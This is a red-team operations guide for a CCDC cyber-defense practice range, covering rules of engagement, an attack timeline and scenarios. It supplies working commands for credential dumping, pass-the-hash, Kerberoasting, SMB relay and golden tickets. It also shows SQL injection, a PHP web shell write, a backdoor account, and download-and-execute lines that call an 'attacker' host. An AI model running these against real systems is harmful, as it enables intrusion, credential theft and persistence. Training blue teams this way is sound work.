# WCC CCDC Red Team Operations Guide

## Overview

The Kali Linux attack box (10.X.99.50) is positioned on the management network to simulate an external attacker with access to the business network. This guide covers red team operations, rules of engagement, and suggested attack scenarios for CCDC practice.

## Red Team Mission

Your role as red team is to:
1. **Challenge the Blue Team** - Test their defensive skills
2. **Teach Through Adversity** - Help them learn real-world attack techniques
3. **Provide Realistic Pressure** - Simulate actual competition conditions
4. **Document Everything** - Create learning opportunities for debrief

## Rules of Engagement

### DO:
✅ Enumerate and scan the network thoroughly  
✅ Exploit weak configurations and default credentials  
✅ Attempt lateral movement and privilege escalation  
✅ Maintain persistence (within limits)  
✅ Document all successful attacks for debrief  
✅ Coordinate major attacks with the coach  
✅ Give blue team adequate hardening time (typically 30-60 min)  

### DON'T:
❌ Take all services completely offline (DoS)  
❌ Delete critical data permanently  
❌ Lock out administrator accounts  
❌ Exceed agreed-upon intensity levels  
❌ Attack during designated "quiet periods"  
❌ Use techniques not approved by coach  

## Kali Box Setup

### Access
```bash
# SSH to Kali box
ssh kali@10.{range_id}.99.50
# Default password: kali

# Switch to root
sudo su -
```

### Workspace
```bash
cd /root/ccdc

# Available directories:
# /root/ccdc/loot       - Stolen credentials, data
# /root/ccdc/payloads   - Custom exploits, scripts
# /root/ccdc/logs       - Attack logs, screenshots
```

### Quick Start
```bash
# Load range configuration
source /root/ccdc/range-config.sh

# Run automated enumeration
./enum.sh

# Review the playbook
cat PLAYBOOK.md
```

## Attack Timeline (4-Hour Practice)

### Phase 1: Reconnaissance (T+0 to T+30)
**Objective**: Map the network without alerting blue team

**Actions**:
```bash
# Passive DNS enumeration
dig @10.{range_id}.10.7 ludus.domain axfr

# Slow, stealthy nmap
nmap -sS -T2 -p- 10.{range_id}.10.0/24 -oA nmap-stealth

# LDAP anonymous enumeration
ldapsearch -x -h 10.{range_id}.10.2 -b "DC=wcc,DC=local"
```

**Goals**:
- Complete network map
- Service identification
- Initial user enumeration
- No alarms triggered

### Phase 2: Initial Access (T+30 to T+90)
**Objective**: Gain first foothold

**Priority Targets**:
1. **Default Credentials** (most likely success)
2. **Unpatched Services** (if blue team hasn't updated)
3. **Weak Passwords** via careful spraying
4. **Exposed Services** (FTP anonymous, open SMB shares)

**Example Attacks**:
```bash
# Try default credentials first
crackmapexec smb 10.{range_id}.10.0/24 -u 'administrator' -p 'ChangeMe123!'

# Check for null sessions
smbclient -L //10.{range_id}.10.3 -N

# Anonymous FTP
ftp 10.{range_id}.10.9
# Try: anonymous / anonymous@ludus.domain

# AS-REP Roasting (no creds needed)
impacket-GetNPUsers ludus.domain/ -dc-ip 10.{range_id}.10.2 -no-pass -usersfile users.txt
```

### Phase 3: Lateral Movement (T+90 to T+150)
**Objective**: Expand access across the network

**With Initial Access**:
```bash
# Dump credentials
impacket-secretsdump ludus.domain/user:pass@10.{range_id}.10.2

# Pass-the-Hash
crackmapexec smb 10.{range_id}.10.0/24 -u Administrator -H <NTLM_HASH>

# Kerberoasting
impacket-GetUserSPNs ludus.domain/user:pass -dc-ip 10.{range_id}.10.2 -request

# Check for juicy shares
crackmapexec smb 10.{range_id}.10.3 -u user -p pass --shares
```

### Phase 4: Persistence & Impact (T+150 to T+240)
**Objective**: Maintain access and demonstrate impact

**Persistence Methods**:
```bash
# Create new admin user (coordinate with coach!)
impacket-addcomputer ludus.domain/admin:pass -dc-ip 10.{range_id}.10.2 -computer-name 'REDTEAM$' -computer-pass 'P@ssw0rd'

# Golden ticket (if KRBTGT compromised)
impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <SID> -domain ludus.domain administrator

# WMI backdoor
crackmapexec smb 10.{range_id}.10.4 -u admin -p pass -x "wmic useraccount where name='backdoor' create"
```

**Impact Demonstrations**:
```bash
# Modify web content (non-destructive)
# Upload defacement page to show compromise

# Exfiltrate "sensitive" data
# Copy data from shares to demonstrate data theft

# Service manipulation (careful!)
# Stop/start services to show control (don't leave down)
```

## Common Attack Vectors

### 1. Active Directory Attacks

#### SMB Relay
```bash
# Setup
responder -I eth0 -wrf

# In another terminal
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"
```

#### Kerberoasting
```bash
# Get TGS tickets for service accounts
impacket-GetUserSPNs ludus.domain/user:password -dc-ip 10.{range_id}.10.2 -request -outputfile kerberoast.txt

# Crack offline
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt --force
```

#### DCSync Attack
```bash
# If you have DCSync rights (DA or similar)
impacket-secretsdump ludus.domain/admin:pass@10.{range_id}.10.2 -just-dc-ntlm
```

### 2. Web Application Attacks

#### SQL Injection
```bash
# Test for SQLi
sqlmap -u "http://10.{range_id}.10.4/page.php?id=1" --batch --dbs

# Dump database
sqlmap -u "http://10.{range_id}.10.4/page.php?id=1" --batch -D database --dump
```

#### Directory Traversal
```bash
# Test common paths
curl http://10.{range_id}.10.4/../../../../etc/passwd
curl http://10.{range_id}.10.4/../../../../windows/system32/config/sam
```

### 3. Database Attacks

#### MSSQL
```bash
# Connect with impacket
impacket-mssqlclient ludus.domain/user:pass@10.{range_id}.10.6

# Once connected:
# SQL> enable_xp_cmdshell
# SQL> xp_cmdshell whoami
```

#### MySQL
```bash
# Connect
mysql -h 10.{range_id}.10.8 -u root -p

# Read files (if FILE privilege)
SELECT LOAD_FILE('/etc/passwd');

# Write web shell
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```

### 4. Privilege Escalation

#### Windows
```bash
# Upload winPEAS
crackmapexec smb 10.{range_id}.10.4 -u user -p pass -M mimikatz

# Powershell Empire
# (See /opt/powershell-empire for setup)
```

#### Linux
```bash
# Upload LinPEAS
scp /opt/PEASS-ng/linPEAS/linpeas.sh debian@10.{range_id}.10.7:/tmp/

# Check for misconfigurations
ssh debian@10.{range_id}.10.7 'sudo -l'
```

## Tools Reference

### Installed on Kali Box

**Network Scanning**:
- `nmap` - Network mapper
- `masscan` - Fast port scanner
- `enum4linux` - SMB enumeration

**AD Attacks**:
- `impacket-*` - Suite of AD attack tools
- `crackmapexec` - Swiss army knife for pentesting
- `responder` - LLMNR/NBT-NS poisoner
- `bloodhound` - AD relationship mapper
- `mimikatz` - Credential dumper

**Web Attacks**:
- `sqlmap` - SQL injection
- `gobuster` - Directory/file brute forcer
- `nikto` - Web scanner
- `wpscan` - WordPress scanner

**Password Attacks**:
- `hydra` - Network login cracker
- `john` - John the Ripper
- `hashcat` - Advanced password recovery

**Post-Exploitation**:
- `metasploit-framework` - Exploitation framework
- `evil-winrm` - WinRM shell
- `powershell-empire` - Post-exploitation agent

### Key Impacket Scripts

```bash
# Credential dumping
impacket-secretsdump ludus.domain/admin:pass@TARGET

# Kerberoasting
impacket-GetUserSPNs ludus.domain/user:pass -dc-ip DC_IP -request

# AS-REP Roasting
impacket-GetNPUsers ludus.domain/ -dc-ip DC_IP -usersfile users.txt

# SMB execution
impacket-psexec ludus.domain/admin:pass@TARGET

# WMI execution
impacket-wmiexec ludus.domain/admin:pass@TARGET

# MSSQL client
impacket-mssqlclient ludus.domain/user:pass@TARGET
```

## Scenario-Based Attacks

### Scenario 1: "Zero Day" (Coach provides vulnerability)
Coach shares a specific vulnerability that exists in the environment. Red team must:
1. Identify the vulnerable system
2. Develop/adapt an exploit
3. Gain initial access
4. Document the attack chain

### Scenario 2: "Insider Threat"
Red team is given low-privilege domain credentials. Objectives:
1. Escalate to Domain Admin
2. Access all file shares
3. Compromise database server
4. Extract all credentials

### Scenario 3: "APT Simulation"
Multi-phase attack over several hours:
1. Initial compromise via phishing (simulated)
2. Establish C2 channel
3. Lateral movement to critical systems
4. Data exfiltration
5. Maintain persistence

### Scenario 4: "Service Disruption"
Test blue team's incident response:
1. Take one service offline (coordinated)
2. Blue team must detect, investigate, restore
3. Red team observes response time and methods
4. Debrief on detection gaps

## Reporting & Documentation

### During Attack
Document in `/root/ccdc/logs/`:
```bash
# Command history
script -a /root/ccdc/logs/session-$(date +%Y%m%d-%H%M).log

# Screenshots
scrot /root/ccdc/logs/screenshot-$(date +%Y%m%d-%H%M%S).png

# Notes
vim /root/ccdc/logs/attack-notes-$(date +%Y%m%d).md
```

### Post-Exercise Report Template
```markdown
# Red Team Report - [Date]

## Executive Summary
- Duration: [X hours]
- Objectives: [Completed Y/Z]
- Critical Findings: [Number]

## Attack Timeline
| Time | Action | Result | Impact |
|------|--------|--------|--------|
| T+30 | Password spray | Success | Low-priv access |
| T+60 | Kerberoast | Success | Service account creds |
| T+90 | Lateral movement | Success | File server access |

## Successful Attacks
1. **Default Credentials** - Multiple systems
2. **SMB Relay** - Captured 3 admin hashes
3. **SQL Injection** - Database compromise

## Blue Team Performance
- **Strengths**: Quick patching, firewall rules
- **Weaknesses**: Logging gaps, slow IR
- **Recommendations**: Enable SMB signing, deploy SIEM

## Lessons Learned
[Key takeaways for both teams]
```

## Debrief Topics

After each session, discuss:
1. **What Worked**: Successful detections and defenses
2. **What Didn't**: Missed attacks, slow responses
3. **Techniques Used**: Explain attack methods
4. **Detection Opportunities**: Where could blue team have caught you?
5. **Hardening Recommendations**: Specific improvements

## Advanced Techniques

### Living off the Land (LOLBins)
```powershell
# Use built-in Windows tools
certutil.exe -urlcache -split -f http://attacker/payload.exe
powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker/script.ps1')"
```

### Fileless Malware
```bash
# In-memory execution
crackmapexec smb TARGET -u admin -p pass -X 'powershell -enc <BASE64_PAYLOAD>'
```

### Pivoting
```bash
# SSH tunneling through compromised host
ssh -D 9050 user@10.{range_id}.10.8
proxychains crackmapexec smb 10.{range_id}.10.0/24
```

## Ethical Reminders

⚠️ **This is a Learning Environment**

- The goal is education, not humiliation
- Help blue team improve, don't just pwn
- Share knowledge in debrief
- Respect the practice environment
- Follow coach guidance always

## Resources

- **MITRE ATT&CK**: https://attack.mitre.org
- **PayloadsAllTheThings**: `/opt/PayloadsAllTheThings`
- **PEASS**: `/opt/PEASS-ng`
- **HackTricks**: https://book.hacktricks.xyz

---

**Remember**: Red team's ultimate goal is to make the blue team better, not to win. Every successful attack is a learning opportunity for everyone.

Good hunting! 🎯
